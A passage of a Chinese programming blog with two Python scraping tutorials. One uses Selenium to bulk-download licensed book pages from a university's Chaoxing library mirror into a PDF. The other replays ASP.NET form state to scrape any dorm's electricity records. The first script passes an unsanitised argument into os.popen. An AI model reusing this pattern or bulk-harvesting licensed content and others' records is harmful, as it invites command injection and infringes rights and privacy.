<!doctype html>
<html class="theme-next   use-motion ">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>



<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />












  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css"/>




  
    <link href='//fonts.lug.ustc.edu.cn/css?family=Lato:300,400,700,400italic&subset=latin,latin-ext' rel='stylesheet' type='text/css'>
  



<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=0.4.5.2" rel="stylesheet" type="text/css" />


  <meta name="keywords" content="Reverland, Hexo, NexT" />





  <link rel="alternate" href="/atom.xml" title="Reverland的行知阁" type="application/atom+xml" />




  <link rel="shortcut icon" type="image/x-icon" href="/images/default_avatar.jpg?v=0.4.5.2" />






<meta name="description" content="我希望生活是诗的，是画的，是无数动听的音符。我希望我是自由的，摇滚的，有一颗黑客的心。">
<meta property="og:type" content="website">
<meta property="og:title" content="Reverland的行知阁">
<meta property="og:url" content="http://reverland.org/page/3/index.html">
<meta property="og:site_name" content="Reverland的行知阁">
<meta property="og:description" content="我希望生活是诗的，是画的，是无数动听的音符。我希望我是自由的，摇滚的，有一颗黑客的心。">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Reverland的行知阁">
<meta name="twitter:description" content="我希望生活是诗的，是画的，是无数动听的音符。我希望我是自由的，摇滚的，有一颗黑客的心。">



<script type="text/javascript" id="hexo.configuration">
  var CONFIG = {
    scheme: '',
    sidebar: 'post',
    motion: true
  };
</script>

  <title> Reverland的行知阁 </title>
</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  <!--[if lte IE 8]>
  <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'>
    <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode">
      <img src="http://7u2nvr.com1.z0.glb.clouddn.com/picouterie.jpg" border="0" height="42" width="820"
           alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today or use other browser ,like chrome firefox safari."
           style='margin-left:auto;margin-right:auto;display: block;'/>
    </a>
  </div>
<![endif]-->
  






  <div class="container one-column 
   page-home 
">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-meta ">
  

  <div class="custom-logo-site-title">
    <a href="/"  class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <span class="site-title">Reverland的行知阁</span>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>
  <p class="site-subtitle">开放、分享、自由与进步</p>
</div>

<div class="site-nav-toggle">
  <button>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
  </button>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu ">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-home fa-fw"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories" rel="section">
            
              <i class="menu-item-icon fa fa-th fa-fw"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-archive fa-fw"></i> <br />
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-tags fa-fw"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about" rel="section">
            
              <i class="menu-item-icon fa fa-user fa-fw"></i> <br />
            
            关于
          </a>
        </li>
      

      
      
    </ul>
  

  
</nav>

 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div id="content" class="content">
          
  <section id="posts" class="posts-expand">

    

    
    

    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/python/2015/04/04/chaoxing/" itemprop="url">
                  Python Spider: 超星图书爬取转换
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2015-04-04T00:00:00+08:00" content="2015-04-04">
              2015-04-04
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/python/" itemprop="url" rel="index">
                    <span itemprop="name">python</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/python/2015/04/04/chaoxing/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="python/2015/04/04/chaoxing/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <h2 id="超星数字图书馆(北邮镜像):_在线阅读书籍爬取转换(selenium)">超星数字图书馆(北邮镜像): 在线阅读书籍爬取转换(selenium)</h2><blockquote>
<p>我忧心忡忡地看待未来，但仍满怀美好的希望。</p>
<p>—— Albert Schweitzer</p>
</blockquote>
<p>这次推荐selenium，自从有了selenium，爬虫从来没有这么简单过。</p>
<hr>
<p>几天前，一个工作的同学想让我帮他借一本书《聚酰亚胺新型材料》，他工作上需要看这本书的一些内容，但是这本书已经绝版，网上也没有出售。</p>
<p>于是我帮他搜索了下，图书馆里没有这本书。忽然想起来我邮还买了很多电子资源。</p>
<p>于是从图书馆主页选择<code>电子图书</code>-&gt;<code>超星数字电子图书数据</code>，进入如下页面。</p>
<p><img src="/images/spider/chaoxing.png" alt=""></p>
<p>搜索了下这本书，找到了一本。</p>
<p><img src="/images/spider/chaoxing1.png" alt=""></p>
<p>太棒了，下载下来……额……下载需要阅读器……</p>
<p><img src="/images/spider/chaoxing2.png" alt=""></p>
<p>对一个伪geek最讨厌的事情之一就是，某个牛比的企业倚杖其资源绑架用户安装所谓的客户端。比如讨厌的腾讯和讨厌的淘宝。</p>
<p>自然也不会下载什么阅读器，但是，既然可以在线看，那么就可以下载下来。实在在不行我浏览器截图行么。</p>
<p>selenium让一切成为可能(包括截图)。</p>
<p>让我们在线阅读：</p>
<p><img src="/images/spider/chaoxing3.png" alt=""></p>
<p>在线阅读提供了一些功能，包括索引、目录和文字提取，悲剧的是下载下来之后转成的pdf可没有这么多道道。虽然，如果肯花时间解决这些都不是问题……但是，我们又不是想pirate电子书……</p>
<p>对页面按右键发现这是个图片！接着观察对应的源码发现，是一个input标签，仔细观察这个input标签你可以看到很多属性，比如比较重要的class、scr、src、jpgname。</p>
<p>仔细多观察一个，你会发现，class是Jimg的似乎都是书页内容、jpgname属性是页码、scr和src好像都是书页图片地址。</p>
<p><img src="/images/spider/chaoxing4.png" alt=""></p>
<p>你可以试试。说服自己那些就是书页图片地址</p>
<p><img src="/images/spider/chaoxing6.png" alt=""></p>
<p>多看几个发现下面的页面其实src属性都是假的，猜测是书页滚动到某个页面，通过js动态修改src来实现实时加载而不是一下全加载。</p>
<p><img src="/images/spider/chaoxing5.png" alt=""></p>
<p>那么，我们抓取当前网页阅读页面所有class属性是<code>Jimg</code>的input标签的<code>scr</code>标签，就可以获取所有书页的图像了。</p>
<p>接下来，看看selenium是多么丧心病狂……</p>
<p>我们把以上所有从搜索到在线阅读的过程自动化……</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> imghdr</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line"><span class="comment"># bookname = u'聚酰亚胺新型材料'</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    bookname = unicode(sys.argv[<span class="number">1</span>], <span class="string">'utf-8'</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[Usage:] chaoxing.py bookname"</span></span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line">driver = webdriver.Firefox()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 首先搜索</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://sslibbook2.sslibrary.com'</span></span><br><span class="line"></span><br><span class="line">driver.get(url)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入书名</span></span><br><span class="line">driver.find_element_by_id(<span class="string">'sword'</span>).send_keys(bookname)</span><br><span class="line"><span class="comment"># 检索</span></span><br><span class="line">driver.find_element_by_class_name(<span class="string">"btn-jiansuo"</span>).click()</span><br><span class="line"><span class="comment"># 检索结果</span></span><br><span class="line">driver.switch_to_frame(<span class="string">'book'</span>)</span><br><span class="line">time.sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(len(driver.find_elements_by_class_name(<span class="string">'yy'</span>)) &gt; <span class="number">1</span>)</span><br><span class="line"><span class="comment"># 确认书名</span></span><br><span class="line"><span class="keyword">assert</span>(driver.find_elements_by_class_name(<span class="string">'yy'</span>)[<span class="number">0</span>].text</span><br><span class="line">       == <span class="string">u"《"</span> + bookname + <span class="string">u"》"</span>)</span><br><span class="line"><span class="comment"># 确认有网页阅读</span></span><br><span class="line"><span class="keyword">assert</span>(driver.find_elements_by_class_name(<span class="string">'yy'</span>)[<span class="number">1</span>].text == <span class="string">u'网页阅读'</span>)</span><br><span class="line"></span><br><span class="line">bookurl = driver.find_elements_by_class_name(<span class="string">'yy'</span>)[<span class="number">1</span>].get_attribute(<span class="string">'href'</span>)</span><br><span class="line"></span><br><span class="line">driver.get(bookurl)</span><br><span class="line"></span><br><span class="line"><span class="comment"># where img locate</span></span><br><span class="line">base_url = <span class="string">"http://"</span> + urllib2.urlparse.urlparse(driver.current_url).netloc</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(driver.page_source.find(<span class="string">u'超星'</span>) &gt;= <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">pages = driver.find_elements_by_xpath(<span class="string">'//input[@class="Jimg"]'</span>)</span><br><span class="line"></span><br><span class="line">filelist = [e.get_attribute(<span class="string">'jpgname'</span>) <span class="keyword">for</span> e <span class="keyword">in</span> pages]</span><br><span class="line"></span><br><span class="line">imglist = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> e <span class="keyword">in</span> pages:</span><br><span class="line">    imglist[e.get_attribute(<span class="string">'jpgname'</span>)] = base_url + e.get_attribute(<span class="string">'scr'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k, v <span class="keyword">in</span> imglist.iteritems():</span><br><span class="line">    <span class="keyword">if</span> os.path.exists(k):</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        urllib.urlretrieve(v, k)</span><br><span class="line">        <span class="keyword">assert</span>(imghdr.what(k) == <span class="string">'png'</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        <span class="keyword">print</span> e</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">u'convert '</span> + <span class="string">u' '</span>.join(filelist) + <span class="string">' '</span> + bookname + <span class="string">u'.pdf'</span></span><br><span class="line">cmd = cmd.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">os.popen(cmd)</span><br></pre></td></tr></table></figure>
<p>稍微解释下，最后，是用imagemagick把一大堆png格式的书页内容转化成pdf格式。这个过程相当耗内存……如果有空就想想怎么换种方式转pdf，也愿各位看官能指教下。</p>
<p><img src="/images/spider/chaoxing7.png" alt=""></p>
<p>当然，我并没有把pdf传给任何人，我看完之后跟同学讲了讲，没有做任何盗版行径。同学们也要遵守用户守则，不要乱搞。</p>
<p>让我们引以为戒 <a href="http://zh.wikipedia.org/wiki/%E4%BA%9A%E4%BC%A6%C2%B7%E6%96%AF%E6%B2%83%E8%8C%A8" target="_blank" rel="external">Aaron Swartz</a></p>
<p><img src="img=http://upload.wikimedia.org/wikipedia/commons/thumb/0/06/Aaron_Swartz_profile.jpg/220px-Aaron_Swartz_profile.jpg" alt="Aaron Swartz"></p>
<p>非法下载书籍的罪名是非常非常严重的！！！！！</p>
<hr>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/python/2015/04/03/ydcx/" itemprop="url">
                  Python Spider: 北邮用电查询系统数据
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2015-04-03T00:00:00+08:00" content="2015-04-03">
              2015-04-03
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/python/" itemprop="url" rel="index">
                    <span itemprop="name">python</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/python/2015/04/03/ydcx/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="python/2015/04/03/ydcx/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <h2 id="愿总有阳光照进回忆里：学生购电用电查询系统">愿总有阳光照进回忆里：学生购电用电查询系统</h2><p>感冒了，难得会被人挂念。谢谢，总有阳光照进回忆里，温暖的气息让人难以忘记。</p>
<hr>
<p>某天，一位大神师兄 @Zhaoking 神秘兮兮地给我看一个网站 <a href="http://ydcx.bupt.edu.cn/" target="_blank" rel="external">http://ydcx.bupt.edu.cn/</a></p>
<p>师兄说，你可以试着把它的数据爬下来。</p>
<p>当时开着八个线程跟着机器学习、回归分析、统计推断、探索性图形分析一堆数据分析的课程，觉得似乎把用电数据爬下来可以玩玩。<br>于是谨听师兄命令……</p>
<p><img src="/images/spider/ydcx.png" alt=""></p>
<p>首先，就是研究研究网站逻辑。打开firebug，输入1-101，回车。</p>
<p><img src="/images/spider/ydcx1.png" alt=""></p>
<p>显然，首先是一个post操作，但返回了一个302重定向，所以，第二个请求应该是正确的请求</p>
<p>试试看看</p>
<pre><code><span class="keyword">In</span> [<span class="number">1</span>]: import requests

<span class="keyword">In</span> [<span class="number">2</span>]: dorm_num = <span class="comment">'1-101'</span>

<span class="keyword">In</span> [<span class="number">3</span>]: r = requests.<span class="keyword">get</span>(<span class="comment">'http://ydcx.bupt.edu.cn/see.aspx?useid=' + dorm_num)</span>
</code></pre><p>检查下r.content，确认在里头看到了电量和加电信息。</p>
<p><img src="/images/spider/ydcx2.png" alt=""></p>
<p>那么，还有这么多页这么办？我们点点看看。页码1已经不能点了，点2。</p>
<p><img src="/images/spider/ydcx3.png" alt=""></p>
<p>竟然变成一个post了，而且post的数据这么多，你可以抱着试试看的心理不加上这些post的数据试试。</p>
<pre><code><span class="keyword">In</span> [<span class="number">5</span>]: __EVENTTARGET = <span class="string">'GridView1'</span>

<span class="keyword">In</span> [<span class="number">6</span>]: __EVENTARGUMENT = <span class="string">'Page$2'</span>

<span class="keyword">In</span> [<span class="number">7</span>]: <span class="keyword">data</span> = {<span class="string">'__EVENTTARGET'</span>: __EVENTTARGET,  <span class="string">'__EVENTARGUMENT'</span>: __EVENTARGUMENT}

<span class="keyword">In</span> [<span class="number">9</span>]: r = requests.post(<span class="string">'http://ydcx.bupt.edu.cn/see.aspx?useid='</span> + dorm_num, <span class="keyword">data</span>=<span class="keyword">data</span>)

<span class="keyword">In</span> [<span class="number">10</span>]: r
Out[<span class="number">10</span>]: &lt;Response [<span class="number">500</span>]&gt;
</code></pre><p>500——internal error……这个错误一般表示服务器内部处理出现错误。怎么回事呢，直觉告诉我们，问题就在于那些Post的参数。</p>
<p>加上试试，</p>
<pre><code> <span class="keyword">In</span> [<span class="number">15</span>]: <span class="keyword">data</span> = {<span class="string">'__EVENTTARGET'</span>: __EVENTTARGET,  <span class="string">'__EVENTARGUMENT'</span>: __EVENTARGUMENT, <span class="string">'__EVENTVALIDATION'</span>: <span class="string">'/wEWCwLMxp63CAKtsp64BAKtsuK4BAKtsva4BAKtsvq4BAKtsu64BAKtsvK4BAKtssa4BAKtssq4BALDuK6IBQKokYx1/Loh35D537/CRr+++EgM74nLP5E='</span>, <span class="string">'__VIEWSTATE'</span>: <span class="string">'/wEPDwULLTIwNzMwNzAxOTAPZBYCAgMPZBYQZg8PFgIeBFRleHQFATFkZAIBDw8WAh8ABQEgZGQCAg8PFgIfAAUyMS0xMDEgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkZAIDDw8WAh8ABQbnlLXku7dkZAIEDw8WAh8ABQwwMDAwMDAwMzg5NTVkZAIFDw8WAh8ABQ0xMC4yMTAuOTYuMjEwZGQCBg88KwANAQAPFgQeC18hRGF0YUJvdW5kZx4LXyFJdGVtQ291bnQCjQNkFgJmD2QWFgIBD2QWBmYPDxYCHwAFMjEtMTAxICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGQCAQ8PFgIfAAURMjAxNC04LTI0IDA6MDA6MDBkZAICDw8WAh8ABQMyMTVkZAICD2QWBmYPDxYCHwAFMjEtMTAxICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGQCAQ8PFgIfAAURMjAxNC04LTIzIDA6MDA6MDBkZAICDw8WAh8ABQMyMThkZAIDD2QWBmYPDxYCHwAFMjEtMTAxICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGQCAQ8PFgIfAAURMjAxNC04LTIyIDA6MDA6MDBkZAICDw8WAh8ABQMyMjBkZAIED2QWBmYPDxYCHwAFMjEtMTAxICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGQCAQ8PFgIfAAURMjAxNC04LTIxIDA6MDA6MDBkZAICDw8WAh8ABQMyMjNkZAIFD2QWBmYPDxYCHwAFMjEtMTAxICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGQCAQ8PFgIfAAURMjAxNC04LTIwIDA6MDA6MDBkZAICDw8WAh8ABQMyMjVkZAIGD2QWBmYPDxYCHwAFMjEtMTAxICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGQCAQ8PFgIfAAURMjAxNC04LTE5IDA6MDA6MDBkZAICDw8WAh8ABQMyMjhk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'</span>} 

<span class="keyword">In</span> [<span class="number">16</span>]: r = requests.post(<span class="string">'http://ydcx.bupt.edu.cn/see.aspx?useid='</span> + dorm_num, <span class="keyword">data</span>=<span class="keyword">data</span>)

<span class="keyword">In</span> [<span class="number">17</span>]: r
Out[<span class="number">17</span>]: &lt;Response [<span class="number">200</span>]&gt;
</code></pre><p>成功的返回了需要的用电数据，你可以检查下r.content看看</p>
<p>接下来的问题在于，这些参数从哪里来的？</p>
<p>简单谷歌下和检查下网页源代码，可以看到</p>
<p><img src="/images/spider/ydcx6.png" alt=""></p>
<p>那么逻辑就清晰了，先get请求某个寝室的页面，获取对应的post参数，然后一页一页往后翻就是。</p>
<p>下面讲讲如何从html源码中提取信息，用re当然可以，但是xpath这种东西也许更好用。比如</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## parse the content</span></span><br><span class="line">root = fromstring(r.content)</span><br><span class="line"><span class="comment">## extract __VIEWSTATE</span></span><br><span class="line">__VIEWSTATE = root.xpath(<span class="string">'//input[@name="__VIEWSTATE"]/@value'</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="comment">## extract __EVENTVALIDATION</span></span><br><span class="line">__EVENTVALIDATION = root.xpath(<span class="string">'//input[@name="__EVENTVALIDATION"]/@value'</span>)[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>
<p>相比写这么个正则简单优雅很多，不过所谓quick and dirty，不管黑猫白猫……：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">re.search(<span class="string">'id="__VIEWSTATE" value="([^"]+)", r.content).group(1)</span></span><br></pre></td></tr></table></figure>
<p>接下来的问题在于，页码总数我不知道，最后的一个…符号可以进入下一个十页。</p>
<p><img src="/images/spider/ydcx4.png" alt=""></p>
<p><img src="/images/spider/ydcx5.png" alt=""></p>
<p>那么，反正最后经过trial and error以一种很quick and dirty的方式work around页码这个问题……</p>
<p>我的解决方案，一个循环，页码不断加一，并且读取当前页右下角所有显示页码。</p>
<p>如果当前页面的那些页码cpn中最后一个，比我下一个想要抓取的np页码小一，或者当前页码个数不是十个，就肯定是最后几页了，就可以抓取然后break不继续往后抓取了。</p>
<p>if (int(cpn[-1]) == np - 1) or (int(cpn[-1]) % 10 != 0):</p>
<p>反正……最后可以运行……</p>
<p><img src="/images/spider/ydcx7.png" alt=""></p>
<p>多么不堪入目的实现，随便看看玩</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span 